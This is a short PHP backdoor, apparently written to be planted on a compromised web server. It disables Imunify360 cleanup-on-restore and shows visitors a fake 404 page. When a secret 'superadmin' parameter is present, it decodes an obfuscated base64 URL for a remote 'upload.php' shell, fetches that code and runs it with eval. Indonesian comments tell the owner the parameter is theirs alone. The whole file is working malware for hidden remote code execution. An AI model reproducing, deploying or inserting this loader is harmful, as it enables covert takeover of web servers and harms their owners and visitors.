<?php
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);

function get_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        $data = file_get_contents($url);
        return $data;
    }
}

$x = '?>';

// [HANYA ANDA YANG TAHU PARAMETER INI]
if (isset($_GET['superadmin'])) { 
    // URL SHELL ANDA (SUDAH BENAR)
    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi91cGxvYWQucGhw');
} else {
    // [PERBAIKAN] JANGAN arahkan ke diri sendiri atau shell orang lain!
    // Cukup tampilkan error 404 saja.
    header("HTTP/1.0 404 Not Found");
    echo "Not Found";
    exit;
}

eval($x . get_data($target_url));
?>
